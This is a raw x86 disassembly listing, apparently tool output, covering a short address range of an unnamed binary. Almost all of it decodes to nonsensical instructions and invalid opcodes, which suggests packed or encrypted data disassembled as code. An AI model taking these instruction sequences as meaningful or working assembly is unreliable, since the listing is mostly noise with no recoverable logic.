  41c66e:	jno    0x41c69a
  41c670:	ss mov eax,0xcfd09e07
  41c676:	mov    al,ds:0x9e396e4f
  41c67b:	scas   al,BYTE PTR es:[edi]
  41c67c:	shl    ch,cl
  41c67e:	into   
  41c67f:	in     eax,0x9c
  41c681:	mov    dh,0xe
  41c683:	clc    
  41c684:	adc    ch,ah
  41c686:	inc    edi
  41c687:	jno    0x41c6ae
  41c689:	pop    esp
  41c68a:	sbb    BYTE PTR [ebp+0x45c534e9],0xdf
  41c691:	pop    ebx
  41c692:	repz add DWORD PTR [edi+0x53],edx
  41c696:	mov    esp,0x955dbdd7
  41c69b:	add    eax,0x5561a3c9
  41c6a0:	add    DWORD PTR [ebp+0x2bdb0807],ecx
  41c6a6:	lea    esp,[ebp+0x6329ae85]
  41c6ac:	push   esi
  41c6ad:	and    al,0xe0
  41c6af:	mov    esp,0xb021f0ae
  41c6b4:	push   esp
  41c6b5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6b8:	push   esi
  41c6b9:	call   0x9088:0x76605abe
  41c6c0:	push   ebx
  41c6c1:	pop    ebx
  41c6c2:	sub    eax,0x5d1fc654
  41c6c7:	ss repz push ebp
  41c6ca:	sar    BYTE PTR [esi+0xb],1
  41c6cd:	outs   dx,BYTE PTR ds:[esi]
  41c6ce:	mov    esp,0x1eb965d8
  41c6d3:	dec    ecx
  41c6d4:	mov    edx,0x16bdf74f
  41c6d9:	xor    bl,cl
  41c6db:	and    eax,0x88b775c5
  41c6e0:	bound  esp,QWORD PTR [ecx+0x39a6fc78]
  41c6e6:	sub    al,0xc9
  41c6e8:	je     0x41c718
  41c6ea:	(bad)  
  41c6eb:	retf   0x822c
  41c6ee:	add    BYTE PTR [esi+0x22],0xb1
  41c6f2:	or     eax,0xd6783030
  41c6f7:	push   0x1
  41c6f9:	in     al,0x75
  41c6fb:	sub    eax,0xa4a66ba2
  41c700:	pop    esp
  41c701:	pushf  
  41c702:	push   0xffffff95
  41c704:	enter  0x8e47,0x1c
  41c708:	enter  0x3144,0x3a
  41c70c:	jl     0x41c77d
  41c70e:	(bad)  
  41c70f:	xor    eax,0xd30bea2d
  41c714:	(bad)  
  41c715:	xlat   BYTE PTR ds:[ebx]
  41c716:	push   es
  41c717:	in     eax,0xa7
  41c719:	test   eax,0xdb851e78
  41c71e:	cmp    esp,DWORD PTR [esi+0x5f]
  41c721:	pop    ss
  41c722:	xchg   DWORD PTR [ecx],ebp
  41c724:	cmc    
  41c725:	jecxz  0x41c6f0
  41c727:	adc    DWORD PTR [esi],esp
  41c729:	stc    
  41c72a:	call   0x3e85e616
  41c72f:	mov    cl,0x94
  41c731:	xchg   esp,eax
  41c732:	popf   
  41c733:	(bad)  
  41c734:	test   eax,0xe1434df4
  41c739:	loopne 0x41c73c
  41c73b:	mov    edx,0xfbf638b6
  41c740:	cs push ss
  41c742:	icebp  
  41c743:	and    edi,DWORD PTR [edi+0x7a622cc9]
  41c749:	pop    esp
  41c74a:	pop    esp
  41c74b:	stos   DWORD PTR es:[edi],eax
  41c74c:	outs   dx,BYTE PTR ds:[esi]
  41c74d:	(bad)
  41c752:	xor    ebx,DWORD PTR [esi]
  41c754:	add    BYTE PTR [edx],0x3
  41c757:	mov    dl,BYTE PTR [ebp+ebx*4+0x145fec68]
  41c75e:	jecxz  0x41c703
  41c760:	sub    eax,0xbe22f645
  41c765:	mov    bh,0x47
  41c767:	in     al,dx
  41c768:	fcmovne st,st(6)
  41c76a:	outs   dx,DWORD PTR ds:[esi]
  41c76b:	(bad)  
  41c76c:	mul    DWORD PTR [ebx]
  41c76e:	stos   BYTE PTR es:[edi],al
  41c76f:	fdiv   DWORD PTR [edx]
  41c771:	push   ebp
  41c772:	inc    ebx
  41c773:	adc    BYTE PTR [ebx],ah
  41c775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c776:	fs jo  0x41c75a
  41c779:	or     dl,BYTE PTR [ecx+esi*1+0x5f]
  41c77d:	sbb    edx,DWORD PTR [eax+esi*1-0x1f]
  41c781:	out    0xff,al
  41c783:	jmp    0x682d:0xa37fd60b
  41c78a:	fmul   QWORD PTR [ebx-0x6d078e92]
  41c790:	icebp  
  41c791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c792:	leave  
  41c793:	in     al,0xaa
  41c795:	(bad)  
  41c796:	dec    eax
  41c797:	cmp    bh,BYTE PTR [edx]
  41c799:	shl    DWORD PTR [ebp-0x8849306],0x8c
  41c7a0:	xlat   BYTE PTR ds:[ebx]
  41c7a1:	sahf   
  41c7a2:	cmp    edi,ebp
  41c7a4:	dec    esi
  41c7a5:	pop    esi
  41c7a6:	aam    0xcc
  41c7a8:	or     ch,BYTE PTR [esi-0x206ac210]
  41c7ae:	pop    ss
  41c7af:	jmp    0x52e581e1
  41c7b4:	inc    ecx
  41c7b5:	call   0xc53e3392
  41c7ba:	push   ds
  41c7bb:	sub    eax,0xeb730b43
  41c7c0:	xchg   esi,eax
  41c7c1:	jb     0x41c830
  41c7c3:	cs rol ecx,1
  41c7c6:	add    bl,BYTE PTR [edi+0x29]
  41c7c9:	or     DWORD PTR [ebx+0x2815037e],ebp
  41c7cf:	popf   
  41c7d0:	pop    ebx
  41c7d1:	ins    DWORD PTR es:[edi],dx
  41c7d2:	outs   dx,BYTE PTR ds:[esi]
  41c7d3:	push   0xf03b688e
  41c7d8:	out    dx,eax
  41c7d9:	(bad)  
  41c7da:	lock pop es
  41c7dc:	das    
  41c7dd:	and    DWORD PTR [esp+eax*4],esp
  41c7e0:	and    BYTE PTR [ecx],cl
  41c7e2:	popf   
  41c7e3:	cmp    DWORD PTR [esi+eiz*8+0x534c1dd0],edi
  41c7ea:	inc    edx
  41c7eb:	jl     0x41c7e9
  41c7ed:	add    ebx,edx
  41c7ef:	jns    0x41c80f
  41c7f1:	and    eax,DWORD PTR [eax]
  41c7f3:	push   DWORD PTR fs:[ebx+0x71f53aad]
  41c7fa:	add    dh,BYTE PTR [esi]
  41c7fc:	mov    ds:0xc6f03b7c,eax
  41c801:	int    0xad
  41c803:	inc    ebx
  41c804:	retf   
  41c805:	mov    ah,0xc7
  41c807:	mov    esi,0x5e179018
  41c80c:	in     al,0xc4
  41c80e:	mov    bh,0xf3
  41c810:	int3   
  41c811:	mov    dh,0x3b
  41c813:	or     DWORD PTR [ebx+0x7ec490db],edx
  41c819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c81a:	and    BYTE PTR [ebp+0x21],0x82
  41c81e:	push   eax
  41c81f:	mov    ebx,0x21481843
  41c824:	call   0xe961:0x71a0d8c4
  41c82b:	shr    BYTE PTR [esi+esi*1],0xa9
  41c82f:	xchg   bh,cl
  41c831:	retf   0xd59c
  41c834:	ins    DWORD PTR es:[edi],dx
  41c835:	xchg   dl,al
  41c837:	mov    esi,DWORD PTR [eax-0x792d1d09]
  41c83d:	jns    0x41c852
  41c83f:	push   edi
  41c840:	movnti DWORD PTR [ebx+ecx*1],eax
  41c844:	aas    
  41c845:	inc    edi
  41c846:	cli    
  41c847:	mov    edi,0xa20adca7
  41c84c:	xlat   BYTE PTR ds:[ebx]
  41c84d:	pop    es
  41c84e:	pop    esp
  41c84f:	add    DWORD PTR [ecx+0x6b1e991],edx
  41c855:	shl    BYTE PTR [ebx+0x4b],1
  41c858:	scas   al,BYTE PTR es:[edi]
  41c859:	xlat   BYTE PTR ds:[ebx]
  41c85a:	ss inc ecx
  41c85c:	jg     0x41c8bb
  41c85e:	idiv   BYTE PTR [ebx+0x49eef90b]
  41c864:	sub    eax,0x697398db
  41c869:	pushf  
  41c86a:	les    esi,FWORD PTR [ebp-0x3]
  41c86d:	popf   
  41c86e:	push   edi
  41c86f:	(bad)  
  41c870:	cmp    DWORD PTR [edi],eax
  41c872:	out    dx,eax
  41c873:	pop    fs
  41c875:	pop    esi
  41c876:	ins    BYTE PTR es:[edi],dx
  41c877:	sbb    BYTE PTR [edx+0x4b],al
  41c87a:	sbb    eax,0x667559da
  41c87f:	pusha  
  41c880:	sbb    BYTE PTR [ecx+ecx*4],bh
  41c883:	shl    edi,0xd2
  41c886:	clc    
  41c887:	je     0x41c830
  41c889:	ins    DWORD PTR es:[edi],dx
  41c88a:	scas   eax,DWORD PTR es:[edi]
  41c88b:	aas    
  41c88c:	popa   
  41c88d:	stos   DWORD PTR es:[edi],eax
  41c88e:	leave  
  41c88f:	jnp    0x41c81c
  41c891:	dec    DWORD PTR [ecx-0x613abdd7]
  41c897:	adc    al,0x6b
  41c899:	xor    DWORD PTR ds:0x3637487,edx
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0x4e9988e2
  41c8c2:	loop   0x41c84b
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    al,ch
  41c8c9:	add    DWORD PTR [eax],eax
  41c8cb:	add    BYTE PTR [ecx],dl
  41c8cd:	jno    0x41c8d4
  41c8cf:	inc    ebx
  41c8d0:	stos   BYTE PTR es:[edi],al
  41c8d1:	and    DWORD PTR [eax],edx
  41c8d3:	ffree  st(1)
  41c8d5:	jae    0x41c8cf
  41c8d7:	cli    
  41c8d8:	jl     0x41c957
  41c8da:	cmp    eax,0x105f6909
  41c8df:	mov    edx,0x5cee1a5f
  41c8e4:	jecxz  0x41c8b9
  41c8e6:	ins    DWORD PTR es:[edi],dx
  41c8e7:	cld    
  41c8e8:	sub    BYTE PTR fs:[ecx-0x71],ah
  41c8ec:	dec    esp
  41c8ed:	cmp    al,0xf
  41c8ef:	out    0xe7,al
  41c8f1:	ror    DWORD PTR [ebx*4+0x6681af88],1
  41c8f8:	je     0x41c89f
  41c8fa:	cmp    DWORD PTR [ebp+0x43],edx
  41c8fd:	xor    eax,0x29f588c8
  41c902:	inc    edi
  41c903:	in     eax,dx
  41c904:	cmp    cl,BYTE PTR [ebx+ecx*4+0x2398e4f7]
  41c90b:	and    bh,bl
  41c90d:	inc    esp
  41c90e:	sbb    ah,BYTE PTR [ebx+0x18]
  41c911:	lea    bp,[edx-0xe]
  41c915:	rcl    DWORD PTR [ecx+0x33fd2ad1],0xcd
  41c91c:	bound  esp,QWORD PTR [edi+0x194f6fbe]
  41c922:	sbb    BYTE PTR [edx+0x1],bl
  41c925:	dec    ebp
  41c926:	adc    eax,0x7a0bd015
  41c92b:	mov    cl,0xc
  41c92d:	(bad)  [esi+0x60]
  41c930:	cli    
  41c931:	popf   
  41c932:	mov    dh,0x93
  41c934:	and    BYTE PTR [esi],bh
  41c936:	inc    ecx
  41c937:	xor    eax,0xc2bd9e4
  41c93c:	in     al,0x1
  41c93e:	and    eax,0x745b1ef9
  41c943:	jb     0x41c8cf
  41c945:	push   edi
  41c946:	loop   0x41c902
  41c948:	sub    al,0xd6
  41c94a:	and    DWORD PTR [eax-0x3f5d6f55],eax
  41c950:	(bad)  
  41c951:	dec    esi
  41c952:	mov    DWORD PTR [edx-0x3ce52a70],esi
  41c958:	repnz jmp 0x8e8:0xa1f6a652
  41c960:	ror    dh,cl
  41c962:	iret   
  41c963:	jo     0x41c953
  41c965:	cli    
  41c966:	daa    
  41c967:	int3   
  41c968:	sub    bh,0xff
  41c96b:	sub    eax,0xf8158693
  41c970:	pusha  
  41c971:	call   DWORD PTR [ebx]
  41c973:	int    0x88
  41c975:	addr16 call 0xf554:0x18233ea4
  41c97d:	(bad)  
  41c97e:	aad    0xff
  41c980:	inc    ecx
  41c981:	jns    0x41c93a
  41c983:	jae    0x41c975
  41c985:	int3   
  41c986:	or     eax,0x9b74e52b
  41c98b:	cmp    BYTE PTR [eax],bl
  41c98d:	out    0x86,eax
  41c98f:	push   es
  41c990:	(bad)  
  41c992:	sbb    BYTE PTR [ecx-0x6af15332],0xf9
  41c999:	test   eax,0xbc7e8d74
  41c99e:	xor    BYTE PTR [edx],bl
  41c9a0:	popa   
  41c9a1:	cmp    eax,0x5a04cc38
  41c9a6:	div    BYTE PTR [ecx+edx*8]
  41c9a9:	aam    0xc0
  41c9ab:	(bad)  
  41c9ad:	lea    edx,[esi+0x4f25792]
  41c9b3:	ret    
  41c9b4:	dec    ebp
  41c9b5:	push   edi
  41c9b6:	inc    edx
  41c9b7:	and    eax,0x49135304
  41c9bc:	rcl    esp,1
  41c9be:	cmp    al,0x70
  41c9c0:	xchg   ecx,eax
  41c9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c2:	retf   0x3154
  41c9c5:	sub    DWORD PTR [eax],edi
  41c9c7:	xor    esi,DWORD PTR [eax]
  41c9c9:	sbb    BYTE PTR [ecx],0x9c
  41c9cc:	push   esp
  41c9cd:	mov    edx,0x41528a90
  41c9d2:	in     eax,dx
  41c9d3:	mov    ah,BYTE PTR [ecx+0x2a]
  41c9d6:	inc    ecx
  41c9d7:	neg    BYTE PTR [esi-0x5f]
  41c9da:	mov    al,ds:0xa1403865
  41c9df:	pop    edx
  41c9e0:	jecxz  0x41c9ca
  41c9e2:	and    al,0x4b
  41c9e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9e5:	addr16 ret 0x165b
  41c9e9:	mov    BYTE PTR [edx+ebx*4+0x79],bh
  41c9ed:	or     BYTE PTR [edi+eiz*1],ch
  41c9f0:	cwde   
  41c9f1:	popa   
  41c9f2:	cmp    eax,DWORD PTR [ebp-0x1a]
  41c9f5:	adc    ebp,DWORD PTR [edi]
  41c9f7:	pop    esp
  41c9f8:	cmp    eax,DWORD PTR [ebx-0x37]
  41c9fb:	xchg   ebx,eax
  41c9fc:	inc    BYTE PTR [edx-0x9]
  41c9ff:	pop    ds
  41ca00:	test   DWORD PTR [eax+eiz*8-0x22095fd8],esi
  41ca07:	ret    0x85e3
  41ca0a:	dec    esi
  41ca0b:	call   0x78c7:0xb30a0a29
  41ca12:	dec    ebp
  41ca13:	sbb    al,0xf6
  41ca15:	add    DWORD PTR [eax*2+0x20c971c7],0xffffff96
  41ca1d:	jle    0x41ca2a
  41ca1f:	fld    DWORD PTR [edi]
  41ca21:	lahf   
  41ca22:	adc    BYTE PTR [eax-0x78a1368a],cl
  41ca28:	cwde   
  41ca29:	jp     0x41ca1b
  41ca2b:	imul   edx,DWORD PTR [edx-0x74],0xffffff91
  41ca2f:	xchg   ebx,eax
  41ca30:	rcr    BYTE PTR [ecx+0x6d],0xf7
  41ca34:	pop    ebx
  41ca35:	retf   0xcc69
  41ca38:	or     al,0x7c
  41ca3a:	push   ebx
  41ca3b:	sub    ebp,ebp
  41ca3d:	std    
  41ca3e:	enter  0x4aef,0x1d
  41ca42:	xchg   DWORD PTR [ebx+0x7],esi
  41ca45:	int3   
  41ca46:	and    al,0x11
  41ca48:	icebp  
  41ca49:	and    ch,BYTE PTR [eax]
  41ca4b:	popa   
  41ca4c:	dec    ebx
  41ca4d:	jbe    0x41ca15
  41ca4f:	adc    DWORD PTR ds:0xb2e0d3b0,ebp
  41ca55:	out    dx,al
  41ca56:	xor    eax,0xa7a6dfbf
  41ca5b:	sbb    BYTE PTR [esi],0x35
  41ca5e:	push   ds
  41ca5f:	out    dx,al
  41ca60:	mov    dl,0xd7
  41ca62:	mov    dh,0x43
  41ca64:	sbb    edx,eax
  41ca66:	pop    ds
  41ca67:	mov    ebp,0x4027f14d
  41ca6c:	(bad)  
  41ca6e:	pop    ebp
  41ca6f:	sbb    dh,BYTE PTR [eax+0x352c0f96]
  41ca75:	aad    0x73
  41ca77:	addr16 inc eax
  41ca79:	(bad)  
  41ca7a:	leave  
  41ca7b:	adc    edx,esp
  41ca7d:	mov    ds:0xbdcc1035,eax
  41ca82:	cmc    
  41ca83:	jg     0x41ca7f
  41ca85:	test   al,0xf4
  41ca87:	out    dx,eax
  41ca88:	xchg   BYTE PTR [ecx],bl
  41ca8a:	pop    ebp
  41ca8b:	int3   
  41ca8c:	adc    eax,0x49473483
  41ca91:	inc    DWORD PTR [ebx-0x6e]
  41ca94:	neg    cl
  41ca96:	dec    esp
  41ca97:	stos   BYTE PTR es:[edi],al
  41ca98:	push   ds
  41ca99:	sub    esi,ecx
  41ca9b:	push   0xffffffe1
  41ca9d:	int    0x84
  41ca9f:	push   ds
  41caa0:	mov    dh,0x9e
  41caa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caa3:	dec    edi
  41caa4:	pop    ebp
  41caa5:	mov    ebp,0xd9896fbe
  41caaa:	cmp    edx,DWORD PTR [esi]
  41caac:	push   edx
  41caad:	inc    edi
  41caae:	or     eax,0x8b578f9d
  41cab3:	aam    0xd1
  41cab5:	sub    al,0x14
  41cab7:	adc    edi,ebp
  41cab9:	cmp    edx,edi
  41cabb:	out    dx,al
  41cabc:	pop    edi
  41cabd:	xchg   bx,ax
  41cabf:	push   0xa99a2c44
  41cac4:	xchg   edi,eax
  41cac5:	xchg   DWORD PTR [ecx],eax
  41cac7:	add    al,ch
  41cac9:	add    DWORD PTR [eax],eax
  41cacb:	add    BYTE PTR [edx+0x1d4a31e9],dl
  41cad1:	dec    esp
  41cad2:	mov    ch,0xd1
  41cad4:	inc    edi
  41cad5:	jne    0x41caf0
  41cad7:	push   0x15057127
  41cadc:	shl    DWORD PTR [ecx+0x75],1
  41cadf:	pop    ebx
  41cae0:	call   0x6d10:0xe670d60
  41cae7:	xor    DWORD PTR [edi-0x19],0x828800ce
  41caee:	not    DWORD PTR [eax+0x3c]
  41caf1:	and    dl,ah
  41caf3:	or     ebx,esi
  41caf5:	cmp    bh,bh
  41caf7:	push   cs
  41caf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf9:	stc    
  41cafa:	cmp    eax,DWORD PTR [esi]
  41cafc:	mov    esi,0xd9a97608
  41cb01:	or     ah,0xcc
  41cb04:	pop    esi
  41cb05:	xor    bh,ah
  41cb07:	or     BYTE PTR [edi+0x2c],0xf0
  41cb0b:	leave  
  41cb0c:	sar    al,1
  41cb0e:	xchg   ecx,eax
  41cb0f:	jp     0x41cabd
  41cb11:	shl    DWORD PTR [edx+0x6d184bea],1
  41cb17:	cli    
  41cb18:	mov    ecx,0x609fc0c2
  41cb1d:	imul   esp,DWORD PTR [ebx+0x26ce4922],0x7d5030c6
  41cb27:	lds    edi,FWORD PTR ds:0xbb094905
  41cb2d:	ret    
  41cb2e:	sub    DWORD PTR [ebx+0x75],ebp
  41cb31:	xchg   esp,eax
  41cb32:	xchg   esi,eax
  41cb33:	ds sbb ch,dh
  41cb36:	pop    esp
  41cb37:	inc    edi
  41cb38:	push   esi
  41cb39:	mov    ecx,0xb022545a
  41cb3e:	dec    eax
  41cb3f:	pop    ecx
  41cb40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb41:	test   eax,0x57667d84
  41cb46:	nop
  41cb47:	retf   0xa742
  41cb4a:	stos   DWORD PTR es:[edi],eax
  41cb4b:	xor    DWORD PTR [eax+0x6f],ebx
  41cb4e:	jnp    0x41cbb5
  41cb50:	das    
  41cb51:	push   esi
  41cb52:	push   ebx
  41cb53:	mov    ah,0x36
  41cb55:	repz in al,dx
  41cb57:	xor    eax,0x5cfc3f10
  41cb5c:	jbe    0x41cba4
  41cb5e:	cdq    
  41cb5f:	xchg   ebx,eax
  41cb60:	xor    eax,0x2c5b3ce6
  41cb65:	std    
  41cb66:	in     al,dx
  41cb67:	cmp    BYTE PTR [edx+0xb],al
  41cb6a:	retf   
  41cb6b:	hlt    
  41cb6c:	pop    ecx
  41cb6d:	mov    cl,BYTE PTR [eax-0xa8fb45d]
  41cb73:	cmp    esi,DWORD PTR [ebx-0x6f]
  41cb76:	dec    ecx
  41cb77:	add    al,0x1a
  41cb79:	out    0xbd,eax
  41cb7b:	ja     0x41cbf0
  41cb7d:	fnsave [edx]
  41cb7f:	or     dh,bl
  41cb81:	pop    ss
  41cb82:	pop    edx
  41cb83:	in     al,dx
  41cb84:	cmp    eax,0x507faf56
  41cb89:	out    0xe9,eax
  41cb8b:	xchg   ebp,eax
  41cb8c:	or     DWORD PTR [edx-0x77e62f5e],esi
  41cb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb93:	xchg   edi,eax
  41cb94:	inc    ebx
  41cb95:	and    DWORD PTR [edi+0x7542b31f],edx
  41cb9b:	push   ecx
  41cb9c:	pop    eax
  41cb9d:	pop    esi
  41cb9e:	in     al,dx
  41cb9f:	cmp    al,0x6f
  41cba1:	sub    BYTE PTR [esi],cl
  41cba3:	(bad)  
  41cba4:	out    dx,eax
  41cba5:	mov    edx,0x3e0efe72
  41cbaa:	dec    esi
  41cbab:	out    0x98,al
  41cbad:	jns    0x41cbe7
  41cbaf:	lds    ebp,FWORD PTR [esi]
  41cbb1:	fsub   QWORD PTR [edx]
  41cbb3:	je     0x41cb68
  41cbb5:	xchg   esp,eax
  41cbb6:	rcl    BYTE PTR [esi+0x35],0xca
  41cbba:	add    DWORD PTR [esi-0x66],0x1b
  41cbbe:	xchg   edx,eax
  41cbbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbc0:	in     al,dx
  41cbc1:	add    bh,BYTE PTR [ecx+0x4b]
  41cbc4:	push   edi
  41cbc5:	sub    cl,0x44
  41cbc8:	stc    
  41cbc9:	xlat   BYTE PTR ds:[ebx]
  41cbca:	sahf   
  41cbcb:	or     eax,0x7bcbae0a
  41cbd0:	jnp    0x41cb67
  41cbd2:	push   edi
  41cbd3:	jge    0x41cbf7
  41cbd5:	mov    ebp,ss
  41cbd7:	pusha  
  41cbd8:	(bad)  
  41cbda:	arpl   dx,di
  41cbdc:	xlat   BYTE PTR ds:[ebx]
  41cbdd:	push   ss
  41cbde:	in     al,0xa2
  41cbe0:	dec    edi
  41cbe1:	mov    bh,0xb2
  41cbe3:	into   
  41cbe4:	ins    BYTE PTR es:[edi],dx
  41cbe5:	ss xchg ebx,eax
  41cbe7:	popf   
  41cbe8:	xor    BYTE PTR [ebx-0x31b8d690],al
  41cbee:	mov    fs,WORD PTR [ecx+0x34080c1f]
  41cbf4:	imul   WORD PTR [edi]
  41cbf7:	pop    ebx
  41cbf8:	in     al,0x21
  41cbfa:	inc    ebp
  41cbfb:	xchg   esp,eax
  41cbfc:	sub    al,0x2
  41cbfe:	sahf   
  41cbff:	xchg   edi,eax
  41cc00:	push   ebx
  41cc01:	jns    0x41cbf0
  41cc03:	les    edx,FWORD PTR [ecx-0x67]
  41cc06:	mov    dh,0xc9
  41cc08:	mov    ebx,0x9eec7df1
  41cc0d:	mov    al,ds:0x8b4b2b0
  41cc12:	inc    esp
  41cc13:	pop    eax
  41cc14:	xchg   BYTE PTR [edx-0x49a1eb7f],al
  41cc1a:	cmp    al,0x76
  41cc1c:	lods   al,BYTE PTR ds:[esi]
  41cc1d:	xchg   ebp,eax
  41cc1e:	mov    ds,WORD PTR [ebx-0x6861bac6]
  41cc24:	addr16 pop eax
  41cc26:	inc    ebx
  41cc27:	fnstenv [ecx+ecx*2]
  41cc2a:	add    al,0x92
  41cc2c:	sub    dh,0x62
  41cc2f:	in     al,dx
  41cc30:	mov    BYTE PTR [edx-0x62d4ed9],bl
  41cc36:	inc    ebx
  41cc37:	fwait
  41cc38:	add    DWORD PTR [ebp+eiz*8+0x7c],eax
  41cc3c:	es pop ecx
  41cc3e:	sar    DWORD PTR [esi],0x94
  41cc41:	test   BYTE PTR [edi-0x30],ah
  41cc44:	mov    dh,0x5
  41cc46:	sbb    DWORD PTR [edx-0x21c48bcc],esi
  41cc4c:	cmp    ecx,ebp
  41cc4e:	xor    eax,0x684b278a
  41cc53:	xchg   ebx,eax
  41cc54:	aas    
  41cc55:	add    eax,0x9e40697b
  41cc5a:	test   DWORD PTR [ebp-0x7],eax
  41cc5d:	add    bh,BYTE PTR [ebx+0x8e76c68]
  41cc63:	mov    ebx,0x16e607ea
  41cc68:	push   edx
  41cc69:	test   DWORD PTR [eax-0x45],ebx
  41cc6c:	pop    esp
  41cc6d:	into   
  41cc6e:	out    dx,al
  41cc6f:	inc    ecx
  41cc70:	cmp    esp,DWORD PTR [edx+ebx*8]
  41cc73:	call   0x830da728
  41cc78:	pop    ss
  41cc79:	shl    bh,0x65
  41cc7c:	in     eax,dx
  41cc7d:	fcomi  st,st(4)
  41cc7f:	je     0x41cc0d
  41cc81:	inc    eax
  41cc82:	ds ret 0x5429
  41cc86:	rcl    ah,0x5d
  41cc89:	add    esi,eax
  41cc8b:	xchg   ecx,eax
  41cc8c:	nop
  41cc8d:	xor    DWORD PTR [ecx+0x178282d9],eax
  41cc93:	xchg   edi,eax
  41cc94:	push   edx
  41cc95:	xor    eax,0x3a357370
  41cc9a:	add    eax,0x5ef68196
  41cc9f:	in     eax,0x3d
  41cca1:	imul   ebx,DWORD PTR cs:[esi+0x4e1a43f3],0xffffff86
  41cca9:	cdq    
  41ccaa:	aas    
  41ccab:	test   BYTE PTR [edi-0x9],dl
  41ccae:	xor    esp,DWORD PTR [esi-0x3c7e1cf9]
  41ccb4:	pop    ds
  41ccb5:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ccbb:	sub    eax,esi
  41ccbd:	add    BYTE PTR [edi+eax*2-0x2c63976a],0x7f
  41ccc5:	mov    DWORD PTR [ecx],eax
  41ccc7:	add    al,ch
  41ccc9:	add    DWORD PTR [eax],eax
  41cccb:	add    BYTE PTR [eax+0x74],bl
  41ccce:	mov    bh,0x1f
  41ccd0:	adc    al,0xde
  41ccd2:	loopne 0x41cd45
  41ccd4:	pop    ds
  41ccd5:	addr16 inc esp
  41ccd7:	ret    0x8087
  41ccda:	mov    edi,DWORD PTR [esi+0x8534611]
  41cce0:	ins    BYTE PTR es:[edi],dx
  41cce1:	mov    bh,0x74
  41cce3:	mov    eax,0x8800ca02
  41cce8:	loopne 0x41cd21
  41ccea:	call   0x8541:0x8f93b10c
  41ccf1:	xchg   esi,eax
  41ccf2:	(bad)  
  41ccf3:	loopne 0x41ccf8
  41ccf5:	xchg   ebx,eax
  41ccf6:	inc    ebx
  41ccf7:	inc    edi
  41ccf8:	mov    eax,ds:0x6087073c
  41ccfd:	clc    
  41ccfe:	and    eax,0xda26e099
  41cd03:	mov    al,0xe5
  41cd05:	cli    
  41cd06:	dec    edi
  41cd07:	enter  0x87db,0xf
  41cd0b:	fs jmp 0xfb9f090b
  41cd11:	into   
  41cd12:	aas    
  41cd13:	pop    es
  41cd14:	mov    BYTE PTR [esi-0x79d24de2],cl
  41cd1a:	fwait
  41cd1b:	xor    esp,DWORD PTR [edi+0x3c]
  41cd1e:	push   esi
  41cd1f:	mov    esp,0xd5f76a05
  41cd24:	xchg   eax,ecx
  41cd26:	loop   0x41cd1f
  41cd28:	stos   BYTE PTR es:[edi],al
  41cd29:	stc    
  41cd2a:	mov    gs,WORD PTR [eax]
  41cd2c:	test   edx,esi
  41cd2e:	jecxz  0x41cd1d
  41cd30:	(bad)  
  41cd31:	das    
  41cd32:	ins    BYTE PTR es:[edi],dx
  41cd33:	enter  0x670c,0xb
  41cd37:	cwde   
  41cd38:	mov    al,0xb
  41cd3a:	popf   
  41cd3b:	fcom   DWORD PTR [ebx]
  41cd3d:	cld    
  41cd3e:	adc    BYTE PTR [bp+di-0x5d],cl
  41cd42:	add    al,0xa4
  41cd44:	scas   al,BYTE PTR es:[edi]
  41cd45:	push   ebx
  41cd46:	ins    BYTE PTR es:[edi],dx
  41cd47:	leave  
  41cd48:	jge    0x41ccd3
  41cd4a:	mov    edx,0x27ac804
  41cd4f:	sub    eax,0xf4c5588b
  41cd54:	mov    al,0x2e
  41cd56:	pop    ecx
  41cd57:	jmp    0x41cdd5
  41cd59:	daa    
  41cd5a:	pop    esi
  41cd5b:	sub    BYTE PTR [ecx],ch
  41cd5d:	or     cl,cl
  41cd5f:	adc    ebx,DWORD PTR [edi]
  41cd61:	cmp    esi,DWORD PTR [esi]
  41cd63:	cmp    ecx,ebp
  41cd65:	and    DWORD PTR [eax],ebx
  41cd67:	into   
  41cd68:	cli    
  41cd69:	pop    edi
  41cd6a:	fnstcw WORD PTR [edx-0x29d4034f]
  41cd70:	popa   
  41cd71:	mov    ecx,0xeeeb3f9d
  41cd76:	arpl   WORD PTR [ebx],si
  41cd78:	mov    ch,0xf6
  41cd7a:	iret   
  41cd7b:	lods   eax,DWORD PTR ds:[esi]
  41cd7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd7d:	mov    ah,0xc6
  41cd7f:	add    edi,ecx
  41cd81:	jmp    0x9984:0xc24646be
  41cd88:	sahf   
  41cd89:	aaa    
  41cd8a:	mov    ebx,0xdd9b7ec8
  41cd8f:	stc    
  41cd90:	fstp   st(3)
  41cd92:	mov    ds,edi
  41cd94:	aas    
  41cd95:	xchg   BYTE PTR [eax-0x5a181a56],bl
  41cd9b:	pushf  
  41cd9c:	mov    WORD PTR [edi-0x3446b885],ds
  41cda2:	add    al,0x97
  41cda4:	jle    0x41cd72
  41cda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda7:	sub    al,0x7b
  41cda9:	fistp  WORD PTR [ecx-0x6a]
  41cdac:	sbb    al,0xb0
  41cdae:	icebp  
